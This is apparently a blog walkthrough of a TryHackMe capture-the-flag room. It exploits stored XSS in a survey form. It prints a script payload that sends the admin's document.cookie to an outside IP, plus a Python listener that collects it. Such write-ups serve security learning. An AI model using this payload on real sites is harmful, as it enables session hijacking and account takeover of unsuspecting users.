---
title: "TryHackMe Cupid's Matchmaker Walkthrough"
date: 2026-02-17
tags:
  - tryhackme
  - ctf
  - easy
  - web
  - walkthrough
  - love at first breach
draft: false
cover:
  image: images/cupids_matchmaker.png
  alt: This is Thumbnail
  caption: ' '
---

Room Link : [Cupid's Matchmaker](https://tryhackme.com/room/lafb2026e3)


Open the Website and you can see there is a survey form,

upon `gobuster` scan we can see there is nothing much but these endpoints

![](Pasted%20image%2020260214212154.png)

the admin panel here redirects to `/login` and `/logout` redirects to `homepage`, but for login we need credentials for which we didn't had any hint.

so we will proceed with the survey form and check how it takes the input

![](Pasted%20image%2020260214213310.png)

here you can see it doesn't sanitise the input, it just changes it to URL encoding.
which can lead to XSS vulnerability.

As you can see that, this app says there is no AI to review it, everything will be done on own by their team members.

so this means they will open application and we will get their cookie back which we can abuse to login to admin account.

So let's see how we will execute it.

```javascript
<script>
new Image().src="http://192.168.138.111:8000/?c="+document.cookie;
</script>
```

we will inject this in the survey form and submit it and setup a python listener, so whenever the admin clicks our survey form to check it we will get the cookie.

use this python code to setup the listener.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.path)   # this will show ?c=the_cookie_here
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

server = HTTPServer(("0.0.0.0", 8000), Handler)
print("Listening on port 8000...")
server.serve_forever()
```

and after sometime you will receive your flag in the form of a cookie.

